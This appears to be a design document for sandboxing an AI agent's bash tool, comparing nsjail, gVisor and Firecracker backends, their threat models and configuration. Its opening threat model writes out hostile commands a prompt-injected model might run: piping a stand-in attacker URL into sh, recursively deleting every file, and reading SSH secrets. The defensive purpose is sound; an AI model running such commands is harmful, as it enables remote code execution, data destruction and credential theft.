# Bash-tool sandbox

The `bash` tool executes shell commands the model chose. Under any
non-trivial threat model that's a privileged operation: a
prompt-injected model can attempt to `curl attacker.example |
sh`, `find / -type f -exec rm {} \;`, or read secrets from
`~/.ssh/`. Rousseau's Podman-Quadlet container spec (dropped caps +
read-only rootfs + rootless + seccomp) already protects the *host*
from the model. This document is about protecting the *daemon
itself* — its state directory, credentials, and other tools' state
— from what the bash tool might run.

## Backends

Configured via `tools.bash.sandbox` in `config.yaml`. Default is
`none` for backwards compatibility.

| Backend | Isolation | Cold-start | External dep | Status |
|---|---|---:|---|---|
| `none` | direct exec | 0ms | — | shipped |
| `nsjail` | kernel namespaces | ~5ms | `nsjail` binary | scaffolded, wiring TODO |
| `gvisor` | user-space syscall interception | ~15ms | `runsc` binary (release-20240226+) | scaffolded, mount TODO |
| `firecracker` | microVM per invocation | ~200ms (pooled) | firecracker binary + rootfs image | scaffold-only |

## Threat model per backend

### `none`

- **Blocks:** nothing.
- **Fine for:** development, single-user daemons where the operator
  trusts every prompt they type themselves.
- **Not fine for:** any deployment where a message can arrive from a
  party other than the operator.

### `nsjail`

- **Blocks:** accidental host writes; unbounded resource use (cpu,
  memory, wallclock, fd count).
- **Does not block:** kernel exploits, /proc information leaks unless
  additional flags are set, network egress unless the container
  itself blocks it.
- **Fine for:** models the operator lightly trusts (e.g. subscription
  Claude via WhatsApp bridge, own-code use case).

### `gvisor`

- **Blocks:** everything nsjail blocks, plus kernel-exploit-carrying
  syscalls (syscalls run against runsc's user-space kernel, not the
  host kernel).
- **Does not block:** side-channel attacks, network egress, model
  reading files it's been explicitly mounted.
- **Fine for:** running arbitrary model-authored code as a first-class
  workflow. Modal, Northflank, and gVisor-enabled kubelets use this
  tier.
- **Cost:** ~15% syscall overhead, ~20MB memory per invocation.

### `firecracker`

- **Blocks:** everything gvisor blocks, plus everything a
  kernel-level guest-VM breakout would need.
- **Cost:** ~200ms cold-start (mitigated by pooling), ~50MB memory
  per micro-VM, requires kernel image + rootfs image to be built and
  stored.
- **Status:** scaffold only. The runtime is a follow-up ticket —
  see `internal/tools/sandbox/firecracker.go`.

## Configuration

```yaml
tools:
  bash:
    sandbox: gvisor              # none | nsjail | gvisor | firecracker
    max_wall_clock_seconds: 60
    max_memory_bytes: 268435456  # 256 MiB
```

The `bash` tool consults the sandbox on each invocation; unavailable
backends (external binary not on PATH) fall back to `none` with a
WARN log.

## Rebuilds required

- To use `nsjail` in the shipped container, add `apk add nsjail` to
  `docker/Dockerfile`. Note: nsjail is not in Alpine's main repo; the
  operator either builds from source or uses `apk add --no-cache
  --repository=community` for edge repos.
- To use `gvisor`, install runsc from google/gvisor releases into
  the image. `runsc` bundles are ~30MB and shouldn't affect the
  distroless image budget materially.
- To use `firecracker`, host must be a bare-metal or nested-virt-
  capable VM (KVM required). Not viable inside rootless Podman
  without extra kernel modules — expect this to require a dedicated
  host, not the daemon's own container.

## What we don't attempt

- **Signature verification of the commands the model runs.** If the
  operator wants that, they can layer a `pre_tool_use` hook (see
  `internal/agent/hooks`).
- **Network isolation.** Backends run inside the daemon's network
  namespace; egress control is Podman's job (`Network=pasta` +
  ipset/iptables outside the container).
- **Persistent tool state.** Every invocation is stateless; if a tool
  needs to remember something across calls it does so via files under
  its own mount, not via sandbox state.
